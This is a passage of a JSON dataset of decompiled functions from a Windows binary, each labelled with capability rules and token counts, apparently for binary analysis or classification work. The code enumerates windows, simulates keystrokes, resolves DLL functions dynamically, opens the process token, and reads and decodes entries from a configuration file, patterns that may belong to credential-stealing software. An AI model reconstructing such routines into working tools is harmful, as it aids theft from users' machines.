0) && (var_4h != 0)) {\n            uVar6 = 0x4660d4;\n            uVar5 = 0x4660d4;\n            uVar4 = 0;\n            uVar2 = var_8h;\n            iVar3 = var_4h;\n            uVar7 = *0x498794;\n            fcn.00409dd4(arg_8h);\n            fcn.00465eac(0x4660d4, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n            fcn.00409ce8();\n            in_stack_ffffff60 = 0x4660f0;\n            fcn.00405800(0x4660f0, 0x4660e0, 0x4660d4, 0);\n            puVar1 = puStack76;\n        }\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff60;\n    fcn.00405490(0x466058);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 748
    },
    "0046611c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046611c(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff64;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack80 = 0x46627d;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405b8c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004058fc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405b8c();\n        var_34h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_34h);\n        if (var_2ch == 3) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 1) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 2) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 8) {\n            fcn.00405504();\n        }\n        else if (var_2ch == 4) {\n            fcn.00405504();\n        }\n        uVar6 = 0x466300;\n        uVar5 = 0x466300;\n        uVar4 = 0;\n        uVar2 = var_8h;\n        iVar3 = var_4h;\n        uVar7 = *0x498794;\n        fcn.00409dd4(arg_8h);\n        fcn.00465eac(0x466300, 0, arg_8h, uVar4, uVar5, uVar2, uVar6, iVar3, uVar7);\n        fcn.00409ce8();\n        in_stack_ffffff64 = 0x46631c;\n        fcn.00405800(0x46631c, 0x46630c, 0x466300, 0);\n        puVar1 = puStack76;\n    }\n    puStack76 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff64;\n    fcn.00405490(0x466284);\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 691
    },
    "00466348": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466348(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uVar4;\n    uint uVar5;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x46641b;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack76;\n    puVar1 = &stack0xfffffffc;\n    if (arg_8h != 0) {\n        fcn.00405b8c();\n        iVar3 = var_4h;\n        if (var_4h != 0) {\n            iVar3 = *(var_4h + -4);\n        }\n        uVar2 = fcn.004058fc(iVar3);\n        sub.user32.dll_GetWindowTextA(arg_8h, uVar2);\n        fcn.00405b8c();\n        var_30h = 0x2c;\n        sub.user32.dll_GetWindowPlacement(arg_8h, &var_30h);\n        iVar3 = sub.user32.dll_IsWindowVisible(arg_8h);\n        puVar1 = puStack68;\n        if ((iVar3 != 0) && (var_4h != 0)) {\n            uVar5 = 0x466434;\n            uVar4 = 0;\n            iVar3 = var_4h;\n            uVar2 = *0x498794;\n            fcn.00409dd4(arg_8h);\n            in_stack_ffffff80 = 0x466440;\n            fcn.00405800(0x466440, 0, arg_8h, uVar4, uVar5, iVar3, uVar2);\n            puVar1 = puStack68;\n        }\n    }\n    puStack68 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffff80;\n    fcn.0040546c(0x466422);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 511
    },
    "00466ed4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00466ed4(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar1;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    uchar *puStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack32 = 0x46700d;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piStack44 = 0x466fe6;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.004054c0();\n    fcn.0045def4();\n    piVar1 = var_4h;\n    (**(*var_4h + 0x78))(var_4h, &fcn.00466ed4::var_8h);\n    fcn.00407208();\n    if (var_8h < 0xf) {\n        if (var_8h == 0xe) {\n            fcn.004054c0();\n        }\n        else if (var_8h == 1) {\n            fcn.004054c0();\n        }\n        else if (var_8h == 2) {\n            fcn.004054c0();\n        }\n        else if (var_8h == 6) {\n            fcn.004054c0();\n        }\n        else if (var_8h == 10) {\n            fcn.004054c0();\n        }\n    }\n    else if (var_8h == 0x12) {\n        fcn.004054c0();\n    }\n    else if (var_8h == 0x22) {\n        fcn.004054c0();\n    }\n    else if (var_8h == 0x32) {\n        fcn.004054c0();\n    }\n    else if (var_8h == 0x42) {\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = piVar1;\n    *in_FS_OFFSET = piStack44;\n    piStack36 = 0x467014;\n    puStack40 = 0x46700c;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 558
    },
    "00467158": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00467158(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 5;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x4673c0;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00467158::var_24h;\n    var_28h = 0x467182;\n    fcn.0040546c();\n    var_28h = 0x46718a;\n    var_28h = fcn.004070f8();\n    var_2ch = 0x467198;\n    fcn.0045def4();\n    var_2ch = var_20h;\n    (**(*var_20h + 0x68))();\n    fcn.00407208();\n    fcn.00407110();\n    iVar2 = fcn.004063dc(0, var_4h, 0x4673d0);\n    if (-1 < iVar2 + -1) {\n        iVar4 = 0;\n        do {\n            fcn.004063dc(&fcn.00467158::var_24h, var_4h, 0x4673d8, iVar4);\n            fcn.00407110();\n            fcn.004063dc(&fcn.00467158::var_28h, var_8h, 0x4673e4);\n            fcn.004056f4();\n            fcn.004063dc(&fcn.00467158::var_2ch, var_8h, 0x4673ec);\n            fcn.004056f4();\n            iVar3 = fcn.004063dc(0, var_8h, 0x4673f4);\n            if (iVar3 < 0xf) {\n                if (iVar3 == 0xe) {\n                    fcn.00405504();\n                }\n                else if (iVar3 == 1) {\n                    fcn.00405504();\n                }\n                else if (iVar3 == 2) {\n                    fcn.00405504();\n                }\n                else if (iVar3 == 6) {\n                    fcn.00405504();\n                }\n                else if (iVar3 == 10) {\n                    fcn.00405504();\n                }\n            }\n            else if (iVar3 == 0x12) {\n                fcn.00405504();\n            }\n            else if (iVar3 == 0x22) {\n                fcn.00405504();\n            }\n            else if (iVar3 == 0x32) {\n                fcn.00405504();\n            }\n            else if (iVar3 == 0x42) {\n                fcn.00405504();\n            }\n            iVar1 = fcn.004063dc(0, var_8h, 0x4674a8);\n            if (iVar1 == 0) {\n                fcn.00405504();\n            }\n            else {\n                fcn.00405504();\n            }\n            var_2ch = 0x4674dc;\n            fcn.00405800();\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x4673c7;\n    var_28h = 0x46738a;\n    fcn.00405c60();\n    var_28h = 0x467392;\n    fcn.004070f8();\n    var_28h = 0x46739a;\n    fcn.004070f8();\n    var_28h = 0x4673a2;\n    fcn.004070f8();\n    var_28h = 0x4673af;\n    fcn.00405490();\n    var_28h = 0x4673b7;\n    fcn.004070f8();\n    var_28h = 0x4673bf;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 1091
    },
    "00467918": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00467918(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX & 0xff;\n    if (0x5a < uVar1) {\n        if (uVar1 < 0xa4) {\n            if (uVar1 == 0xa3) goto code_r0x00467983;\n            if (((uVar1 - 0x5b < 4) || (uVar1 == 0x60)) || (uVar1 - 0x7b < 4)) goto code_r0x004679a2;\n        }\n        else if (((uVar1 == 0xa7) || (uVar1 == 0xb0)) || (uVar1 == 0xb5)) goto code_r0x00467983;\ncode_r0x004679bd:\n        sub.user32.dll_VkKeyScanA();\n        fcn.004678f8();\n        return;\n    }\n    if (uVar1 < 0x2e) {\n        if (uVar1 == 0x23) {\ncode_r0x004679a2:\n            fcn.004678e0();\n            sub.user32.dll_VkKeyScanA();\n            fcn.004678f8();\n            fcn.004678e0();\n            return;\n        }\n        if ((uVar1 != 0x25) && (uVar1 != 0x2b)) goto code_r0x004679bd;\n    }\n    else if ((0xb < uVar1 - 0x2e) && (uVar1 != 0x3f)) {\n        if (uVar1 == 0x40) goto code_r0x004679a2;\n        if (0x19 < uVar1 - 0x41) goto code_r0x004679bd;\n    }\ncode_r0x00467983:\n    fcn.004678c4();\n    sub.user32.dll_VkKeyScanA();\n    fcn.004678f8();\n    fcn.004678c4();\n    return;\n}\n",
        "token_count": 462
    },
    "00467df4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00467df4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack404;\n    uint uStack400;\n    uchar *puStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_15ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_178h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    puStack384 = 0x467e25;\n    fcn.00405f08();\n    uStack388 = 0x467f5b;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe78;\n    puStack396 = 0x467e3e;\n    puStack384 = &stack0xfffffffc;\n    fcn.0040546c();\n    puStack396 = 0x467e46;\n    fcn.00467d58();\n    puStack396 = 0x467e53;\n    fcn.00405738();\n    puStack396 = 0x467e5b;\n    cVar1 = fcn.0040a208();\n    if (cVar1 != '\\0') {\n        puStack396 = 0x467e6e;\n        fcn.0040e7a4();\n        puStack396 = 0x467e79;\n        fcn.00405504();\n        puStack396 = 0x467e8c;\n        fcn.00405784();\n        puStack396 = 0x467ea2;\n        iVar2 = fcn.0040a400();\n        if (iVar2 == 0) {\n            uStack400 = 0x467ef7;\n            *in_FS_OFFSET = &stack0xfffffe6c;\n            puStack396 = &stack0xfffffffc;\n            do {\n                uStack404 = 0x467f98;\n                fcn.00405800();\n                iVar2 = fcn.0040a450();\n            } while (iVar2 == 0);\n            *in_FS_OFFSET = uStack404;\n            fcn.0040a474(0x467efe);\n            return;\n        }\n        puStack396 = 0x467f16;\n        fcn.004059a4();\n        puStack396 = 0x467f24;\n        fcn.004054c0();\n    }\n    *in_FS_OFFSET = uStack392;\n    puStack384 = 0x467f62;\n    uStack388 = 0x467f3c;\n    fcn.0040546c();\n    uStack388 = 0x467f4d;\n    fcn.00405fcc();\n    uStack388 = 0x467f5a;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 664
    },
    "00468870": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_188h\n// WARNING: Variable defined which should be unmapped: var_184h\n// WARNING: Variable defined which should be unmapped: var_17dh\n// WARNING: Variable defined which should be unmapped: var_190h\n// WARNING: Variable defined which should be unmapped: var_18ch\n// WARNING: Variable defined which should be unmapped: var_1a4h\n// WARNING: Variable defined which should be unmapped: var_1a0h\n// WARNING: Variable defined which should be unmapped: var_19ch\n// WARNING: Variable defined which should be unmapped: var_198h\n// WARNING: Variable defined which should be unmapped: var_194h\n// WARNING: Variable defined which should be unmapped: var_1a8h\n// WARNING: Variable defined which should be unmapped: var_1b0h\n// WARNING: Variable defined which should be unmapped: var_1ach\n// WARNING: Variable defined which should be unmapped: var_1b8h\n// WARNING: Variable defined which should be unmapped: var_1b4h\n// WARNING: Variable defined which should be unmapped: var_1c0h\n// WARNING: Variable defined which should be unmapped: var_1bch\n// WARNING: Variable defined which should be unmapped: var_1c4h\n// WARNING: Variable defined which should be unmapped: var_1c8h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00468870(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    int32_t var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    int32_t var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_17dh;\n    uint var_179h;\n    uint var_175h;\n    uint var_171h;\n    uint uStack368;\n    uchar auStack364 [3];\n    uint lpReturnedString;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint *puStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint *puStack308;\n    uint *puStack304;\n    uint uStack300;\n    uint *puStack296;\n    uint uStack292;\n    uint *puStack288;\n    uint uStack284;\n    uint *puStack280;\n    uint uStack276;\n    uint *puStack272;\n    uint *puStack268;\n    uint *puStack264;\n    uint *puStack260;\n    uint *puStack256;\n    uint *puStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uchar *puStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    uint uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint *var_54h;\n    int32_t var_50h;\n    uchar *var_4ch;\n    uint lpNumberOfBytesRead;\n    uint var_44h;\n    code *var_40h;\n    code *var_3ch;\n    code *var_38h;\n    code *var_34h;\n    code *var_30h;\n    code *var_2ch;\n    code *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 0x3f;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_20h = 0x469139;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00468870::var_24h;\n    var_28h = 0x46889e;\n    var_18h = unaff_EDI;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    fcn.0040546c();\n    var_28h = 0x4688ae;\n    fcn.00468714();\n    var_2ch = 0x469150;\n    var_30h = 0x46916c;\n    var_34h = 0x4688ce;\n    fcn.00405800();\n    var_34h = 0x4688d9;\n    var_34h = fcn.004058fc();\n    var_38h = 0x4688df;\n    sub.kernel32.dll_LoadLibraryA();\n    var_38h = 0x4688ef;\n    fcn.00468714();\n    var_3ch = 0x469150;\n    var_40h = 0x469184;\n    var_44h = 0x46890f;\n    fcn.00405800();\n    var_44h = 0x46891a;\n    var_44h = fcn.004058fc();\n    lpNumberOfBytesRead = 0x468920;\n    sub.kernel32.dll_LoadLibraryA();\n    lpNumberOfBytesRead = 0x468930;\n    fcn.00468714();\n    var_4ch = 0x469150;\n    var_50h = 0x469198;\n    var_54h = 0x468950;\n    fcn.00405800();\n    var_54h = 0x46895b;\n    var_54h = fcn.004058fc();\n    var_58h = 0x468961;\n    sub.kernel32.dll_LoadLibraryA();\n    var_58h = 0x468971;\n    fcn.00468714();\n    var_58h = var_1a0h;\n    var_5ch = 0x469150;\n    var_60h = 0x4691ac;\n    uStack104 = 0x468991;\n    fcn.00405800();\n    uStack104 = 0x46899c;\n    uStack104 = fcn.004058fc();\n    uStack108 = 0x4689a2;\n    sub.kernel32.dll_LoadLibraryA();\n    uStack108 = 0x4689b2;\n    fcn.00468714();\n    uStack112 = 0x469150;\n    uStack116 = 0x4691c0;\n    uStack120 = 0x4689d2;\n    fcn.00405800();\n    uStack120 = 0x4689dd;\n    uStack120 = fcn.004058fc();\n    uStack124 = 0x4689e3;\n    sub.kernel32.dll_LoadLibraryA();\n    uStack124 = 0x4689f3;\n    fcn.00468714();\n    uStack128 = 0x469150;\n    uStack132 = 0x4691d4;\n    uStack136 = 0x468a13;\n    fcn.00405800();\n    uStack136 = 0x468a1e;\n    uStack136 = fcn.004058fc();\n    uStack140 = 0x468a24;\n    sub.kernel32.dll_LoadLibraryA();\n    uStack140 = 0x468a34;\n    fcn.00468714();\n    uStack144 = 0x469150;\n    uStack148 = 0x4691ec;\n    uStack152 = 0x468a54;\n    fcn.00405800();\n    uStack152 = 0x468a5f;\n    uStack152 = fcn.004058fc();\n    uStack156 = 0x468a65;\n    sub.kernel32.dll_LoadLibraryA();\n    uStack156 = 0x468a75;\n    fcn.00468714();\n    uStack160 = 0x469150;\n    uStack164 = 0x469204;\n    uStack168 = 0x468a95;\n    fcn.00405800();\n    uStack168 = 0x468aa0;\n    uStack168 = fcn.004058fc();\n    uStack172 = 0x468aa6;\n    uStack224 = sub.kernel32.dll_LoadLibraryA();\n    uStack172 = 0x469210;\n    uStack180 = 0x468ab3;\n    uStack176 = uStack224;\n    var_28h = sub.kernel32.dll_GetProcAddress_1();\n    uStack180 = 0x46921c;\n    uStack188 = 0x468ac1;\n    uStack184 = uStack224;\n    var_2ch = sub.kernel32.dll_GetProcAddress_1();\n    uStack188 = 0x469234;\n    uStack196 = 0x468acf;\n    uStack192 = uStack224;\n    var_30h = sub.kernel32.dll_GetProcAddress_1();\n    uStack196 = 0x46924c;\n    uStack204 = 0x468add;\n    uStack200 = uStack224;\n    var_34h = sub.kernel32.dll_GetProcAddress_1();\n    uStack204 = 0x469260;\n    uStack212 = 0x468aeb;\n    uStack208 = uStack224;\n    var_38h = sub.kernel32.dll_GetProcAddress_1();\n    uStack212 = 0x469270;\n    uStack220 = 0x468af9;\n    uStack216 = uStack224;\n    var_3ch = sub.kernel32.dll_GetProcAddress_1();\n    uStack220 = 0x469280;\n    uStack228 = 0x468b07;\n    var_40h = sub.kernel32.dll_GetProcAddress_1();\n    uStack228 = 0x469290;\n    uStack232 = 0x468b14;\n    puStack236 = sub.kernel32.dll_LoadLibraryA();\n    uStack232 = 0x46929c;\n    uStack240 = 0x468b21;\n    sub.kernel32.dll_GetProcAddress_1();\n    uStack240 = 0x468b33;\n    fcn.00468714();\n    uStack240 = var_1c8h;\n    uStack244 = 0x469150;\n    uStack248 = 0x469184;\n    puStack252 = 0x468b53;\n    fcn.00405800();\n    puStack252 = 0x468b5e;\n    cVar1 = fcn.0046883c();\n    if (cVar1 != '\\0') {\n        puStack252 = 0x468b76;\n        fcn.00468714();\n        puStack256 = 0x469150;\n        puStack260 = 0x469184;\n        puStack264 = 0x468b96;\n        fcn.00405800();\n        puStack264 = 0x468ba1;\n        puStack264 = fcn.004058fc();\n        puStack268 = 0x468ba7;\n        puStack304 = sub.kernel32.dll_LoadLibraryA();\n        puStack268 = 0x4692b8;\n        uStack276 = 0x468bb4;\n        puStack272 = puStack304;\n        *0x4987b4 = sub.kernel32.dll_GetProcAddress_1();\n        uStack276 = 0x4692c8;\n        uStack284 = 0x468bc4;\n        puStack280 = puStack304;\n        *0x4987b8 = sub.kernel32.dll_GetProcAddress_1();\n        uStack284 = 0x4692d8;\n        uStack292 = 0x468bd4;\n        puStack288 = puStack304;\n        *0x4987bc = sub.kernel32.dll_GetProcAddress_1();\n        uStack292 = 0x4692ec;\n        uStack300 = 0x468be4;\n        puStack296 = puStack304;\n        *0x4987c0 = sub.kernel32.dll_GetProcAddress_1();\n        uStack300 = 0x4692fc;\n        puStack308 = 0x468bf4;\n        *0x4987c4 = sub.kernel32.dll_GetProcAddress_1();\n        puStack308 = &fcn.00468870::var_44h;\n        uStack312 = 8;\n        uStack316 = 0x468c04;\n        uStack316 = sub.kernel32.dll_GetCurrentProcess();\n        uStack320 = 0x468c0a;\n        sub.advapi32.dll_OpenProcessToken();\n        uStack320 = 0x468c1a;\n        fcn.00468714();\n        uStack324 = 0x469314;\n        uStack328 = 0x469330;\n        uStack332 = 0x468c3a;\n        fcn.00405800();\n        uStack332 = 0x468c45;\n        uStack332 = fcn.004058fc();\n        uStack336 = 0x104;\n        puStack340 = &fcn.00468870::lpReturnedString;\n        uStack344 = 0x469340;\n        uStack348 = 0x469344;\n        uStack352 = 0x46934c;\n        uStack356 = 0x468c66;\n        sub.kernel32.dll_GetPrivateProfileStringA();\n        uStack356 = 0x468c76;\n        fcn.00468714();\n        stack0xfffffe98 = 0x469314;\n        _auStack364 = 0x468c97;\n        fcn.004056dc();\n        uStack368 = 0x469360;\n        stack0xfffffe8c = 0x468cb2;\n        fcn.00405800();\n        stack0xfffffe8c = 0x468cbd;\n        uVar2 = fcn.004058fc();\n        stack0xfffffe8c = 0;\n        stack0xfffffe88 = 0;\n        stack0xfffffe84 = 3;\n        stack0xfffffe80 = 0;\n        uVar2 = sub.kernel32.dll_CreateFileA_1(uVar2, 0x80000000, 1);\n        uVar3 = sub.kernel32.dll_GetFileSize_1(uVar2, 0);\n        uVar4 = fcn.00402ef0();\n        sub.kernel32.dll_ReadFile_1(uVar2, uVar4, uVar3, &fcn.00468870::lpNumberOfBytesRead, 0);\n        sub.kernel32.dll_CloseHandle_1(uVar2);\n        fcn.00405664();\n        fcn.00402f0c();\n        fcn.00405a48();\n        fcn.004059a4();\n        iVar5 = var_4h;\n        if (var_4h != 0) {\n            iVar5 = *(var_4h + -4);\n        }\n        if (iVar5 < 1) {\n            fcn.00468714();\n            fcn.004056dc(0x469314, var_1e8h);\n            fcn.00405800(0x469384, var_1ech);\n            fcn.0046875c();\n            fcn.00405504();\n        }\n        fcn.00468714();\n        fcn.004056dc(0x469314, var_1f4h);\n        fcn.00405800(var_1f8h);\n        uVar2 = fcn.004058fc();\n        iVar5 = (*var_28h)(uVar2);\n        if (iVar5 == 0) {\n            puStack252 = 0x468dfc;\n            var_4ch = (*var_30h)();\n            if (var_4ch != NULL) {\n                puStack252 = NULL;\n                puStack256 = 0x1;\n                puStack264 = 0x468e14;\n                puStack260 = var_4ch;\n                iVar5 = (*var_34h)();\n                if (iVar5 == 0) {\n                    while( true ) {\n                        puStack252 = 0x4690e9;\n                        iVar5 = fcn.0040572c();\n                        if (iVar5 == 0) break;\n                        puStack252 = &fcn.00468870::var_8h;\n                        puStack256 = 0x468e35;\n                        fcn.00405a48();\n                        puStack256 = 0x468e45;\n                        fcn.00405964();\n                        var_50h = var_8h;\n                        if (var_8h != 0) {\n                            var_50h = *(var_8h + -4);\n                        }\n                        puStack256 = 0x468e6f;\n                        fcn.004059a4();\n                        puStack256 = &fcn.00468870::var_ch;\n                        puStack260 = 0x468e80;\n                        fcn.00405a48();\n                        puStack260 = 0x468e90;\n                        fcn.00405964();\n                        var_54h = var_ch;\n                        if (var_ch != NULL) {\n                            var_54h = var_ch[-1];\n                        }\n                        puStack260 = 0x468eba;\n                        fcn.004059a4();\n                        puStack260 = 0x468ec8;\n                        fcn.00409af4();\n                        if (var_1fch == 0) {\n                            puStack260 = 0x4693a8;\n                            puStack264 = var_ch;\n                            puStack268 = 0x4693bc;\n                            puStack272 = 0x468f12;\n                            fcn.00405800();\n                        }\n                        else {\n                            puStack260 = var_1ch;\n                            puStack264 = 0x46939c;\n                            puStack268 = 0x4693a8;\n                            puStack272 = var_ch;\n                            uStack276 = 0x4693bc;\n                            puStack280 = 0x468ef3;\n                            fcn.00405800();\n                        }\n                        while( true ) {\n                            puStack252 = 0x4690d9;\n                            iVar5 = fcn.0040572c();\n                            if (iVar5 == 0) break;\n                            puStack252 = &fcn.00468870::var_10h;\n                            puStack256 = 0x468f28;\n                            fcn.00405a48();\n                            puStack256 = 0x468f38;\n                            fcn.00405964();\n                            puStack256 = 0x468f54;\n                            fcn.004059a4();\n                            puStack256 = var_10h;\n                            if (var_10h != 0) {\n                                puStack256 = *(var_10h + -4);\n                            }\n                            puStack260 = 0x468f69;\n                            puStack260 = fcn.004058fc();\n                            puStack264 = &fcn.00468870::var_171h;\n                            puStack268 = NULL;\n                            puStack272 = 0x468f76;\n                            (*var_2ch)();\n                            puStack256 = NULL;\n                            puStack260 = &fcn.00468870::var_17dh;\n                            puStack264 = &fcn.00468870::var_171h;\n                            puStack268 = 0x468f8c;\n                            iVar5 = (*var_38h)();\n                            if (iVar5 == 0) {\n                                puStack256 = 0x468fa1;\n                                fcn.00405664();\n                                puStack256 = 0x468faf;\n                                fcn.00405b8c();\n                                var_58h = var_10h;\n                                if (var_10h != 0) {\n                                    var_58h = *(var_10h + -4);\n                                }\n                                if (var_58h == 0) {\n                                    puStack256 = 0x468fd9;\n                                    fcn.00405504();\n                                }\n                                puStack256 = 0x468fe4;\n                                fcn.00405738();\n                            }\n                            puStack256 = &fcn.00468870::var_14h;\n                            puStack260 = 0x468ff5;\n                            fcn.00405a48();\n                            puStack260 = 0x469005;\n                            fcn.00405964();\n                            puStack260 = 0x469021;\n                            fcn.004059a4();\n                            var_5ch = var_14h;\n                            if (var_14h != 0) {\n                                var_5ch = *(var_14h + -4);\n                            }\n                            puStack260 = var_5ch;\n                            puStack264 = 0x469044;\n                            puStack264 = fcn.004058fc();\n                            puStack268 = &fcn.00468870::var_171h;\n                            puStack272 = NULL;\n                            uStack276 = 0x469051;\n                            (*var_2ch)();\n                            puStack260 = NULL;\n                            puStack264 = &fcn.00468870::var_17dh;\n                            puStack268 = &fcn.00468870::var_171h;\n                            puStack272 = 0x469067;\n                            iVar5 = (*var_38h)();\n                            if (iVar5 == 0) {\n                                puStack236 = 0x46907c;\n                                fcn.00405664();\n                                puStack236 = 0x46908a;\n                                fcn.00405b8c();\n                                var_60h = var_10h;\n                                if (var_10h != 0) {\n                                    var_60h = *(var_10h + -4);\n                                }\n                                if (var_60h == 0) {\n                                    puStack236 = 0x4690b4;\n                                    fcn.00405504();\n                                }\n                                puStack236 = var_1ch;\n                                uStack240 = 0x4693bc;\n                                uStack244 = var_18h;\n                                uStack248 = 0x4693bc;\n                                puStack252 = 0x4690d1;\n                                fcn.00405800();\n                            }\n                        }\n                    }\n                }\n                puStack252 = 